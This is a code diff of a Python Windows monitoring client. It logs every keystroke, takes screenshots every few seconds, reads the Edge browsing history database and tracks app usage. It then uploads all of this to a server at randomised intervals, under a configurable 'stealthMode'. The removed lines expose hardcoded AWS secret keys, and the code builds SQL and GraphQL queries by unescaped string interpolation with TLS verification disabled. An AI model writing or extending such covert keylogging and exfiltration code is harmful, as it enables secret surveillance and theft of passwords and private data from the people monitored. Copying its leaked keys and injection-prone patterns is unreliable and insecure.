@@ -1,28 +1,72 @@
-import datetime
-import time
 from mss import mss
-import boto3
-import glob
-import os
-import threading
-import sqlite3
+import glob, os, threading, json, datetime, time, requests, random
 from pywinauto import Desktop
-import json
 from pynput import keyboard
-import sys
-import requests
-import win32api
+from sys import argv
+from win32api import GetUserName
+requests.packages.urllib3.disable_warnings()
 
 strokes = []
 
-ROOT_DIR = sys.argv[1]
-# ROOT_DIR = "."
+ROOT_DIR = argv[1]
+APP = True
+DEV_LOC = "\\engine" if APP else ""
+
+import sqlite3
+from typing import List
+
+class DbConnector():
+	def __init__(self, name="engine.db"):
+		self.name = name
+		self.init()
+
+	def init(self):
+		self.conn = sqlite3.connect(self.name, check_same_thread=False)
+
+	def executemany(self, commands: List[str], commit : bool = False):
+		try:
+			for cmd in commands:
+				self.conn.executescript(cmd)
+			if commit:
+				self.conn.commit()
+		except sqlite3.OperationalError:
+			pass
+
+	def execute(self, command: str, commit : bool = False):
+		try:
+			self.conn.execute(command)
+			if commit:
+				self.conn.commit()
+		except sqlite3.OperationalError:
+			pass
+
+	def fetch_one(self, command: str):
+		try:
+			ftchr = self.conn.execute(command)
+			return ftchr.fetchone()
+		except sqlite3.OperationalError:
+			return None
+
+	def fetch_all(self, command: str):
+		try:
+			ftchr = self.conn.execute(command)
+			return ftchr.fetchall()
+		except sqlite3.OperationalError:
+			return None
+
+	def close(self):
+		self.conn.close()
+
+db_conn = DbConnector()
+
+if not os.path.isdir(ROOT_DIR + DEV_LOC + "\\user_data"):
+	os.mkdir(ROOT_DIR + DEV_LOC + "\\user_data")
 
 class KeyStrokeWriter(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
 		self.date = str(datetime.datetime.now().date())
-		self.start_time = str(datetime.datetime.now().strftime("%H %M %S"))
+		self.start_time = datetime.datetime.now().strftime("%d-%m-%Y+%H-%M-%S")
 		self.interval_time = 20
 		self.kill = False
 		print("Created Key stroke writer thread")
@@ -31,7 +75,7 @@ class KeyStrokeWriter(threading.Thread):
 		print("Started Key stroke writer thread")
 		global strokes
 		while True:
-			with open(ROOT_DIR + "\\engine\\user_data\\{}\\{}".format(self.date, self.start_time), 'a+') as fl:
+			with open(ROOT_DIR + DEV_LOC + "\\user_data\\{}\\{}.ks".format(self.date, self.start_time), 'a+') as fl:
 				fl.writelines(strokes)
 			strokes = []
 			if self.kill:
@@ -69,7 +113,7 @@ class key_stroke_listener(threading.Thread):
 			print("No need to run key stroke logger in this mode")
 
 class screen_shot_capture(threading.Thread):
-	def __init__(self, mode, interval_time = 5):
+	def __init__(self, mode, interval_time = 10):
 		threading.Thread.__init__(self)
 		self.kill = False
 		self.mode = mode
@@ -79,7 +123,7 @@ class screen_shot_capture(threading.Thread):
 
 	def capture_screen(self):
 		with mss() as sct:
-			sct.shot(output = ROOT_DIR + '\\engine\\user_data\\{}\\images/{}.png'.format(self.date, str(datetime.datetime.now().time().strftime("%H %M %S"))))
+			sct.shot(output = ROOT_DIR + DEV_LOC + '\\user_data\\{}\\images/{}.png'.format(self.date, str(datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S"))))
 
 	def run(self):
 		print("Started screen shot capture thread")
@@ -95,7 +139,7 @@ class app_usage_tracking(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
 		self.date = str(datetime.datetime.now().date())
-		self.opened_apps = ( dict(json.load(open(ROOT_DIR + "\\engine\\user_data\\{}\\apps_usage.json".format(self.date), 'r'))) if os.path.isfile(ROOT_DIR + "\\engine\\user_data\\{}\\apps_usage.json".format(self.date)) else {})
+		self.opened_apps = ( dict(json.load(open(ROOT_DIR + DEV_LOC + "\\user_data\\{}\\apps_usage.json".format(self.date), 'r'))) if os.path.isfile(ROOT_DIR + DEV_LOC + "\\user_data\\{}\\apps_usage.json".format(self.date)) else {})
 		self.interval_time = 5
 		self.kill = False
 		print("Created App usage tracker thread")
@@ -106,7 +150,7 @@ class app_usage_tracking(threading.Thread):
 				self.opened_apps[app] += self.interval_time
 			else:
 				self.opened_apps[app] = 0
-			json.dump(dict(self.opened_apps), open(ROOT_DIR + '\\engine\\user_data\\{}\\apps_usage.json'.format(self.date), "w+"))
+			json.dump(dict(self.opened_apps), open(ROOT_DIR + DEV_LOC + '\\user_data\\{}\\apps_usage.json'.format(self.date), "w+"))
 		self.opened_apps = {k: v for k,v in sorted(self.opened_apps.items(), key=lambda kv: kv[1], reverse=True)}
 
 	def run(self):
@@ -122,28 +166,34 @@ class browser_track_history(threading.Thread):
 		self.kill = False
 		self.interval_time = 5
 		self.mode = mode
-		self.db_loc = r'C:\Users\{}\AppData\Local\Microsoft\Edge Beta\User Data\Default\History'.format(win32api.GetUserName())
+		self.db_loc = f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History'
 		print("Created browser history tracker thread")
+
+	def get_browser_data(self, timestamp):
+		con = DbConnector(self.db_loc)
+		ret = None
+		results = con.fetch_all(f"select url, title, visit_count, datetime(last_visit_time/1e6-11644473600,'unixepoch','localtime') from urls WHERE last_visit_time > {timestamp} ORDER BY last_visit_time DESC")
+		if results:
+			ret = results
+		con.close()
+		return ret
 
 	def run(self):
 		print("Started browser history tracker thread")
 		if self.mode in [1,4]:
-			conn = sqlite3.connect(ROOT_DIR + "\\engine\\test.db")
-			now = (datetime.datetime.now().timestamp() + 11644473600) * (10**6)
+			now = (datetime.datetime(2021, 1, 1).timestamp() + 11644473600) * (10**6)
 			while True and not self.kill:
-				try:
-					con = sqlite3.connect(self.db_loc)
-					c = con.cursor()
-					c.execute("select url, title, visit_count, datetime(last_visit_time/1e6-11644473600,'unixepoch','localtime') from urls WHERE last_visit_time > {} ORDER BY last_visit_time DESC LIMIT 10".format(now)) #Change this to your prefered query
-					results = c.fetchall()
-					for r in results:
-						conn.execute("INSERT INTO browser_history(url, description, visit_time, visit_count) VALUES ('{}', '{}', '{}', {})".format(r[0], r[1], r[3], r[2]))
-						conn.commit()
+				results = self.get_browser_data(now)
+				if results:
+					try:
+						for r in results:
+							db_conn.execute(f"INSERT INTO browser_history(url, description, visit_time, visit_count) VALUES ('{r[0]}', '{r[1]}', '{r[3]}', {r[2]})")
+					except Exception as e:
+						print(e)
 					now = (datetime.datetime.now().timestamp() + 11644473600) * (10**6)
 					time.sleep(5)
-				except sqlite3.OperationalError:
+				else:
 					time.sleep(10)
-					# print("Cannot open databse")
 					pass
 			print("Stopped browser tracking history thread")
 		else:
@@ -152,14 +202,14 @@ class browser_track_history(threading.Thread):
 class user_client(threading.Thread):
 	def __init__(self, mode = 4, interval_time = 5):
 		threading.Thread.__init__(self)
-		self.date = str(datetime.datetime.now().date())
-		if not os.path.isdir(ROOT_DIR + '\\engine\\user_data\\' + self.date):
-			os.mkdir(ROOT_DIR + '\\engine\\user_data\\{}'.format(self.date))
-			os.mkdir(ROOT_DIR + '\\engine\\user_data\\{}\\images'.format(self.date))
+		self.date = str(datetime.date.today())
+		if not os.path.isdir(ROOT_DIR + DEV_LOC + '\\user_data\\' + self.date):
+			os.mkdir(ROOT_DIR + DEV_LOC + '\\user_data\\{}'.format(self.date))
+			os.mkdir(ROOT_DIR + DEV_LOC + '\\user_data\\{}\\images'.format(self.date))
 		self.start_time = datetime.datetime.now().time().strftime("%H %M %S")
 		self.interval_time = interval_time
 		self.exit_time = datetime.datetime.now().time().strftime("%H %M %S")
-		self.config = json.load(open(ROOT_DIR + "\\engine\\config.json"))
+		self.config = json.load(open(ROOT_DIR + DEV_LOC + "\\config.json"))
 		self.run_tasks = {}
 		self.max_interval_idle = 120
 		self.idle_time = 0
@@ -175,51 +225,45 @@ class user_client(threading.Thread):
 		if self.config['aut'] and 'aut' in self.modes_tasks[self.mode-1]:
 			self.run_tasks['aut'] = app_usage_tracking()
 		self.kill = False
-		conn = sqlite3.connect(ROOT_DIR + "\\engine\\test.db")
-		conn.execute(""" INSERT INTO user_active_status (date, start_time, end_time, mode) VALUES ('{}', '{}', '{}', {}); """.format(self.date, self.start_time, self.exit_time, self.mode))
-		conn.commit()
-		conn.execute("""INSERT INTO kv_pair (key, value) VALUES('mode', '{0}') ON CONFLICT(key) DO UPDATE SET value='{0}';""".format(self.mode))
-		conn.execute("""INSERT INTO kv_pair (key, value) VALUES('aut', '0') ON CONFLICT(key) DO UPDATE SET value='0';""")
-		conn.commit()
-		conn.close()
+		db_conn.executemany(commands = [
+			f""" INSERT INTO user_active_status (date, start_time, end_time, mode) VALUES ('{self.date}', '{self.start_time}', '{self.exit_time}', {self.mode}); """,
+			f"""INSERT INTO kv_pair (key, value) VALUES('mode', '{self.mode}');""",
+			"""INSERT INTO kv_pair (key, value) VALUES('aut', 0);"""
+			], commit = True)
+		# conn.execute("""INSERT INTO kv_pair (key, value) VALUES('mode', '{0}') ON CONFLICT(key) DO UPDATE SET value='{0}';""".format(self.mode))
+		# conn.execute("""INSERT INTO kv_pair (key, value) VALUES('aut', '0') ON CONFLICT(key) DO UPDATE SET value='0';""")
 		print("Started User Monitoring")
 
 	def add_usage_data(self):
 		self.exit_time = datetime.datetime.now().strftime("%H %M %S")
-		conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
-		conn.execute(""" UPDATE user_active_status SET end_time = '{}' WHERE date = '{}' and start_time = '{}' and mode={}; """.format(self.exit_time, self.date, self.start_time, self.mode))
-		conn.commit()
-		conn.close()
+		db_conn.execute(
+			f""" UPDATE user_active_status SET end_time = '{self.exit_time}' WHERE date = '{self.date}' and start_time = '{self.start_time}' and mode={self.mode}; """, commit = True
+		)
 
 	def kill_child_threads(self):
 		for task in self.run_tasks:
 			self.run_tasks[task].kill = True
 
 	def is_working(self):
-		conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
 		global strokes
 		if len(strokes) < 1:
-				self.idle_time += self.interval_time
+			self.idle_time += self.interval_time
 		else:
 			self.idle_time = 0
 		if self.idle_time > self.max_interval_idle:
-			print("Are you there")
-			conn.execute("UPDATE kv_pair SET value=1 WHERE key = 'aut';")
-			conn.commit()
+			db_conn.execute("UPDATE kv_pair SET value=1 WHERE key = 'aut';", commit = True)
 			st = time.perf_counter()
 			act = False
 			while time.perf_counter() - st < 25 and not act:
-				cr = conn.execute("SELECT value FROM kv_pair WHERE key = 'aut';")
-				# dt = cr.fetchall()
-				if int(cr.fetchone()[0]) == 0:
+				val = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'aut';")
+				if val and int(val[0]) == 0:
 					self.idle_time = 0
 					print("fine you are")
 					return True
 				time.sleep(1)
 			if not act:
 				print("nope you aren't")
-				conn.execute("UPDATE kv_pair SET value=0 WHERE key = 'aut';")
-				conn.commit()
+				db_conn.execute("UPDATE kv_pair SET value=0 WHERE key = 'aut';", commit = True)
 				return False
 		return True
 
@@ -241,58 +285,102 @@ class user_client(threading.Thread):
 				time.sleep(self.interval_time)
 		print("Stopped user client thread")
 
-class user_image_uploader(threading.Thread):
-	def __init__(self, email):
+class UserDataUploader(threading.Thread):
+	def __init__(self, email, token):
 		threading.Thread.__init__(self)
 		self.email = email
-		self.__bucket_name = "usermonitoringimages"
-		self.session = boto3.Session(
-			aws_access_key_id = "AKIAXJ3ESTWNQQ2MGMX3",
-			aws_secret_access_key = "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"
-		)
-		self.s3_bucket_client = self.session.client('s3')
-		self.base_url = "http://127.0.0.1:8000/api/"
+		self.token = token
+		self.base_url = "http://127.0.0.1:8000/"
 		print("Started Image uploading service.")
 
 	def add_browser_data(self):
-		conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
-		cr = conn.execute("SELECT * FROM browser_history")
-		data = cr.fetchall()
+		data = db_conn.fetch_all("SELECT * FROM browser_history")
+		rm = True
 		for db in data:
-			query = 'mutation add_browser_usage{addBrowserUsage(email: "' + self.email + '", url: "' + db[0] +'", description: "' + db[1] + '", visitTime: "' + db[2] + '", vstCnt: ' + str(db[3]) + ') { result } }'
-			res = requests.post(url = self.base_url, data = {'query': query})
-		conn.execute("DELETE FROM browser_history;")
-		conn.commit()
-		conn.close()
+			query = f"""mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: "{db[0]}", description: "{db[1]}", visitTime: "{db[2]}", vstCnt: {str(db[3])}) {{ result }} }}"""
+			res = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
+			if res.status_code != 200:
+				rm = False
+				break
+		if rm:
+			db_conn.execute("DELETE FROM browser_history;", commit = True)
+
+	def add_key_strokes(self):
+		dat_files = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\*.ks")
+		for file in dat_files:
+			try:
+				ob = file.split("\\")
+				dt = ob[-2]
+				if dt != str(datetime.date.today()):
+					file_name = ob[-1].split(".")[0]
+					dl = False
+					with open(file, "rb") as fle:
+						req = requests.post(f"{self.base_url}upload/{self.email}/ak/{file_name}/{dt}", files={"file": fle})
+						if req.status_code == 200:
+							if req.json()["status"] == 1:
+								dl = True
+						else:
+							break
+					if dl:
+						os.remove(file)
+			except Exception as e:
+				print("Error uploading file", file, file_name, e)
+
+	def send_app_usage_data(self):
+		apps_usage_file = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\apps_uage.json")
+		for file in apps_usage_file:
+			try:
+				dt = file.split("\\")[-2]
+				rm = True
+				with open(file) as fl:
+					dat = json.load(fl)
+					for app, tm in dat.items():
+						query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {app}, openTime: {tm}, date: {dt}) {{ result }} }} """
+						req = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
+						if req.status_code != 200:
+							rm = False
+							break
+				if rm:
+					os.remove(file)
+			except Exception as e:
+				pass
+			os.remove(file)
+
+	def add_images(self):
+		img_fls = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\images\\*.png")
+		for file in img_fls:
+			try:
+				file_name = file.split("\\")[-1].split(".")[0]
+				rm = False
+				with open(file, "rb") as fle:
+					req = requests.post(f"{self.base_url}upload/{self.email}/css/{file_name}/", files={"file": fle})
+					if req.status_code == 200:
+						if req.json()["status"] == 1:
+							rm = True
+						else:
+							break
+					else:
+						break
+				if rm:
+					os.remove(file)
+			except Exception as e:
+				print("Error uploading file", file, file_name, e)
 
 	def run(self):
 		while True:
 			self.add_browser_data()
-			img_fls = glob.glob(ROOT_DIR + "\\engine\\user_data\\*\\images\\*.png")
-			dat_files = glob.glob(ROOT_DIR + "\\engine\\user_data\\*\\*")
-			for file in img_fls:
-				self.s3_bucket_client.upload_file(file, self.__bucket_name, self.email + file.split("user_data")[1].replace("\\", "/"))
-				os.remove(file)
-			for file in dat_files:
-				nm = file.split("user_data")[1]
-				if not nm.startswith("\\{}".format(datetime.datetime.now().date())) and "images" not in nm:
-					self.s3_bucket_client.upload_file(file, self.__bucket_name, self.email + file.split("user_data")[1].replace("\\", "/"))
-					try:
-						os.remove(file)
-					except:
-						os.rmdir(file)
-			time.sleep(60)
-
+			self.add_images()
+			self.add_key_strokes()
+			self.send_app_usage_data()
+			time.sleep(random.randint(180, 600))
 
 class mode_listener(threading.Thread):
 	def __init__(self, mode = 4):
 		threading.Thread.__init__(self)
 		self.monitor_thread = user_client(mode = mode)
 		self.base_url = "http://127.0.0.1:8000/api/"
-		conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
-		cr = conn.execute("SELECT value FROM kv_pair WHERE key = 'email';")
-		self.email = cr.fetchone()[0]
-		conn.close()
+		val = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'email';")
+		self.email = val[0] if val else None
 
 	def stop_main_thread(self):
 		self.monitor_thread.kill = True
@@ -306,17 +394,19 @@ class mode_listener(threading.Thread):
 
 	def upload_usage_data(self):
 		crnt_date = datetime.datetime.now().date()
-
-		conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
-		cr = conn.execute("SELECT * FROM user_active_status WHERE date != '{}';".format(crnt_date))
-		data = cr.fetchall()
-		data = [ (_[0], str(datetime.datetime.strptime(_[1], '%H %M %S').time()), int((datetime.datetime.strptime(_[2], '%H %M %S') - datetime.datetime.strptime(_[1], '%H %M %S')).total_seconds()), _[3]) for _ in data ]
+		data = db_conn.fetch_all("SELECT * FROM user_active_status WHERE date != '{}';".format(crnt_date))
+		data = [ 
+			(
+				_[0], 
+				str(datetime.datetime.strptime(_[1], '%H %M %S').time()), 
+				int((datetime.datetime.strptime(_[2], '%H %M %S') - datetime.datetime.strptime(_[1], '%H %M %S')).total_seconds()), 
+				_[3]
+			) for _ in data 
+		]
 		for db in data:
-			query = 'mutation add_user_usage{addUserUsage(email: "' + self.email + '", date: "' + db[0] + '", startTime: "' + db[1] + '", workTime: ' + str(db[2]) + ", mode: " + str(db[3]) + ") { result } } "
-			res = requests.post(url = self.base_url, data = {'query': query})
-			conn.execute("DELETE FROM user_active_status WHERE date != '{}';".format(crnt_date))
-			conn.commit()
-		conn.close()
+			query = f"mutation add_user_usage{{ addUserUsage(email: \"{self.email}\", date: \"{db[0]}\", startTime: \"{db[1]}\", workTime: {db[2]}, mode: {str(db[3])}) {{ result }} }}"
+			requests.post(url = self.base_url, json = {'query': query}, verify = False)
+			db_conn.execute(f"DELETE FROM user_active_status WHERE date != '{crnt_date}';", commit = True)
 
 	def run(self):
 		if self.email:
@@ -324,12 +414,11 @@ class mode_listener(threading.Thread):
 			self.upload_usage_data()
 			print("Finished Uploading data to the server")
 			self.monitor_thread.start()
-			conn = sqlite3.connect(ROOT_DIR + "\\engine\\test.db")
-			cr = conn.execute(""" SELECT value FROM kv_pair WHERE key='mode'; """)
-			crnt_mode = int(cr.fetchone()[0])
+			val = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
+			crnt_mode = int(val[0])
 			while True:
-				cr = conn.execute(""" SELECT value FROM kv_pair WHERE key='mode'; """)
-				ch_mode = int(cr.fetchone()[0])
+				cr = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
+				ch_mode = int(cr[0])
 				if ch_mode != crnt_mode:
 					self.stop_main_thread()
 					self.create_new_thread(mode = ch_mode)
@@ -345,31 +434,45 @@ class mode_listener(threading.Thread):
 			print("The app is unregistered. Please download from the site again.")
 
 if __name__ == "__main__":
-	conn = sqlite3.connect(ROOT_DIR + '\\engine\\test.db')
-	conn.execute(""" CREATE TABLE IF NOT EXISTS kv_pair (key STRING primary key, value STRING); """)
-
-	conn.execute(""" CREATE TABLE IF NOT EXISTS user_active_status (date DATE, start_time TIME, end_time TIME, mode INT)""")
-	conn.execute(""" CREATE TABLE IF NOT EXISTS browser_history (url TEXT, description TEXT, visit_time DATETIME, visit_count INT)""")
-	
-	cr = conn.execute("SELECT value FROM kv_pair WHERE key = 'email';")
-	email = cr.fetchone()
-	if email == None:
+	db_conn.executemany(commands = [
+		""" CREATE TABLE IF NOT EXISTS kv_pair (key STRING primary key ON CONFLICT REPLACE, value STRING); """,
+		""" CREATE TABLE IF NOT EXISTS user_active_status (date DATE, start_time TIME, end_time TIME, mode INT)""",
+		""" CREATE TABLE IF NOT EXISTS browser_history (url TEXT, description TEXT, visit_time DATETIME, visit_count INT)""",
+		], commit = True
+	)
+	email = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'email';")
+	token = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'token';")
+	if (email == None) or (token == None):
 		print("not working")
-		conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', 0) ON CONFLICT(key) DO UPDATE set value = 0;")
+		# conn.execute(""" UPDATE kv_pair SET value = 0 WHERE key = 'register'; """)
+		db_conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', '0');", commit = True)
 	else:
 		email = email[0]
-		if not os.path.isfile(ROOT_DIR + "\\engine\\config.json"):
-			query = 'query getConfig{ getConfig(email: "' + email + '"){ role, css, ak, aut, bth, sm } }'
-			res = requests.post(url = "http://127.0.0.1:8000/api/", data = {'query': query})
-			resp = json.loads(res.text)['data']['getConfig'][0]
-			config = {"role": resp['role'], "css": resp['css'], "ak": resp['ak'], "bth": resp['bth'], "aut": resp['aut'], "sm": resp['sm'] }
-			json.dump(config, open(ROOT_DIR + "\\engine\\config.json", "w+"))
-		conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', 1) ON CONFLICT(key) DO UPDATE set value = 1;")
-		conn.execute("DELETE FROM kv_pair WHERE key != 'email' and key != 'register';")
-		conn.commit()
-		image_uploader_thread = user_image_uploader(email)
+		token = token[0]
+		if not os.path.isfile(ROOT_DIR +  DEV_LOC + "\\config.json"):
+			query = f'query get_user_config{{ getUserConfig(email: "{email}", token: "{token}"){{ role, captureScreenShots, activeKeyLogger, browserTrackingHistory, appsUsageTracking, stealthMode }} }}'
+			res = requests.post(url = "http://127.0.0.1:8000/api/", json = {'query': query}, verify = False)
+			if res.status_code == 200:
+				json_data = res.json()
+				if "data" in json_data and "getUserConfig" in json_data["data"]:
+					resp = json_data['data']['getUserConfig']
+					config = {
+						"role": resp['role'], 
+						"css": resp['captureScreenShots'], 
+						"ak": resp['activeKeyLogger'], 
+						"bth": resp['browserTrackingHistory'], 
+						"aut": resp['appsUsageTracking'], 
+						"sm": resp['stealthMode'] 
+					}
+					with open(ROOT_DIR + DEV_LOC + "\\config.json", "w+") as fl:
+						json.dump(config, fl)
+		db_conn.execute(""" UPDATE kv_pair SET value = 1 WHERE key = 'register'; """)
+		# db_conn.executemany(commands = [
+		# 	"INSERT INTO kv_pair (key, value) VALUES ('register', 1);",
+		# 	"DELETE FROM kv_pair WHERE key != 'email' and key != 'register';"
+		# ], commit=True)
+		image_uploader_thread = UserDataUploader(email, token)
 		md_lstn_thread = mode_listener(mode = 4)
 
 		image_uploader_thread.start()
-		md_lstn_thread.start()	
-	# conn.close()
+		md_lstn_thread.start()
